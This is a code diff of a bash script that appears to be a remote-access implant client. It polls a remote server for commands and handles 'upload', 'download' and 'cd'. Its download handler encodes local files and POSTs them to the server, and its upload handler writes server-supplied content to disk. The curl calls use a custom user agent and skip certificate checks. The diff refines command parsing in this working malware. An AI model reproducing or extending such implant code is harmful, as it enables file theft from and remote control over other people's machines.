@@ -65,7 +65,8 @@ while true; do
       fi
 
       if [[ $invoke64 == upload* ]]; then
-         file_path=$(echo $invoke64 | cut -d " " -f 3)
+         file_path="${invoke64#upload }"
+         file_path=$(echo $file_path | cut -d "!" -f 2)
          file_request=$(curl -A "$cagent" -s -k -X GET "$server/api/download")
          file_content=$(echo "$file_request" | grep -oP "File: \K.*")
          R64Decoder -t "$file_content" > "$file_path"
@@ -73,16 +74,18 @@ while true; do
       fi
 
       if [[ $invoke64 == download* ]]; then
-         file_path=$(echo $invoke64 | cut -d " " -f 2)
+         file_path="${invoke64#download }"
+         file_path=$(echo $file_path | cut -d "!" -f 1)
          file_content=$(R64Encoder -f "$file_path")
          download=$(curl -A "$cagent" -s -k -X POST "$server/api/upload" -d "File: $file_content")
          continue
       fi
 
       if [[ $invoke64 == cd* ]]; then
-         new_dir=$(echo "$invoke64" | cut -d " " -f 2)
+         new_dir="${invoke64#cd }"
          if [ "${new_dir:0:1}" != "/" ]; then
             new_dir="$pwdnew/$new_dir"
+            new_dir=$(echo "$new_dir" | sed 's/["'\'']//g')
          fi
          if [ -d "$new_dir" ]; then
             cd "$new_dir"
